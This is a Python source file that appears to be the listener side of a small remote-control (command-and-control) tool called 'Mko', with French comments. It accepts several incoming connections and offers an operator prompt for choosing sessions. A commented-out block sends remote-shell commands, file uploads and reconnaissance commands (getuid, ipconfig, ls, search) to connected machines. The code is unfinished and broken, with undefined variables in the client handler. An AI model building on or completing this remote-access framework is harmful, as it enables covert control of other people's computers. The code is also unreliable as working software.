import lib
import socket
import threading
import os
from command_controller import Client


server_host = '0.0.0.0'
server_port = 1234
max_number_of_connections = 5

threads = {}
clients = []


def handle_client(conn, addr):
    print(f"\n[+] New connection with {addr[0]}:{addr[1]} \nMko >", end=" ")

    # os_client = conn.recv(1024).decode('utf-8')
    # client = Client(os_client)  # Create a new client object
    # print(f"Client OS: {client.get_client_os()}")

    while True:
        try:
            message = client_socket.recv(1024).decode('utf-8')
            if not message:
                break
            print(f"[{addr}] {message}")

        except:
            break

        # command = input("MKo > ")
        # if command == "exit":
        #     conn.send(command.encode('utf-8'))
        #     break
        #
        # if command == "help" or command == "?":
        #     lib.print_help()
        #     continue
        #
        # if command.startswith("upload"):
        #     file_path = command.split(" ")[1]
        #     if not os.path.isfile(file_path):
        #         print(f"Le fichier {file_path} n'existe pas.")
        #         continue
        #
        #     print(f"Uploading {file_path}...")
        #     conn.send(command.encode('utf-8'))
        #
        #     file_size = os.path.getsize(file_path)
        #     conn.send(file_size.to_bytes(8, 'big'))
        #     print(f"Sent file size: {file_size} bytes")
        #
        #     with open(file_path, "rb") as file:
        #         while (chunk := file.read(1024)):
        #             conn.send(chunk)
        #
        #     print("File uploaded successfully")
        #
        # if command == "shell":
        #     conn.send(command.encode('utf-8'))
        #     while True:
        #         command = input("MKo (shell) > ")
        #         if command == "exit":
        #             conn.send(command.encode('utf-8'))
        #             break
        #
        #         conn.send(command.encode('utf-8'))
        #         output = conn.recv(4096).decode('utf-8')
        #         print(output)
        #
        # if command == "getuid":
        #     conn.send(client.getuid().encode('utf-8'))
        #     output = conn.recv(1024).decode('utf-8')
        #     print(output)
        #
        # if command == "ipconfig":
        #     conn.send(command.encode('utf-8'))
        #     output = conn.recv(4096).decode('utf-8')
        #     print(output)
        #
        # if command == "ls":
        #     conn.send(client.ls().encode('utf-8'))
        #     output = conn.recv(4096).decode('utf-8')
        #     print(output)
        #
        # if command == "pwd":
        #     conn.send(command.encode('utf-8'))
        #     output = conn.recv(1024).decode('utf-8')
        #     print(output)
        #
        # if command.lower().startswith("search"):
        #     conn.send(command.encode('utf-8'))
        #     output = conn.recv(4096).decode('utf-8')
        #     print(output)
        #
        if command == "":
            print("help or ? to display help")
            print("you can also use ? <command> to get help on a specific command")
            print("\n")
            continue

    print(f"[+] Connection closed with {addr[0]}:{addr[1]}")
    conn.close()


def accept_clients(s):
    while True:
        conn, addr = s.accept()
        clients.append((conn, addr))
        thread = threading.Thread(target=handle_client, args=(conn, addr))

        # prepare to store the next thread ID
        if len(threads) == 0:
            next_thread_id = 0
        else:
            next_thread_id = max(threads.keys()) + 1

        # start the thread
        thread.start()

        # store the thread ID
        id_thread = thread.ident
        threads[next_thread_id] = id_thread

        # print(f"[CONNECTION WAITING] {addr[0]}:{addr[1]} is waiting. Thread ID: {thread.ident}")


# Fonction pour interagir avec le terminal et choisir un thread
def command_line_interface():
    while True:
        command = input("Mko > ")

        # if the command is to use a thread
        if command.startswith("use"):
            try:
                thread_id = int(command.split()[1])
                if thread_id in threads:
                    print(f"Vous utilisez maintenant le thread {thread_id}")
                    # interact with the selected thread here

                    break
                elif thread_id in threads.values():
                    print(f"Vous utilisez maintenant le thread {thread_id}")
                    # interact with the selected thread here

                    break
                else:
                    print(f"Aucun thread trouvé avec l'ID {thread_id}")
            except ValueError:
                print("ID de thread invalide. Veuillez entrer un numéro de thread valide.")

        # if the command is to list all threads
        elif command == "list":
            print("ID   TID   \n--   ---  ")
            for thread_id in threads:
                print(f"{thread_id}   {threads[thread_id]}")
            print("\n")

        else:
            print("Unknow command. Try 'use <ID>' or 'list' to list all threads.")


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((server_host, server_port))
    s.listen(max_number_of_connections)

    print(f"[+] Waiting for connection on port {server_port}...")

    accept_thread = threading.Thread(target=accept_clients, args=(s,))
    accept_thread.start()

    # Display threads control information - GUI
    command_line_interface()

    # Attendre que le thread d'acceptation se termine
    accept_thread.join()
    s.close()

    for conn, addr in clients:
        conn.close()

    # while True:
    # conn, addr = s.accept()
    # thread = threading.Thread(target=handle_client, args=(conn, addr))
    # thread.start()
    #
    # # afficher les threads actifs
    # print(f"{threading}")
    #
    # # afficher le nombre de threads actifs
    # print(f"[+] Threads actifs: {threading.active_count() - 1}")


if __name__ == "__main__":
    main()
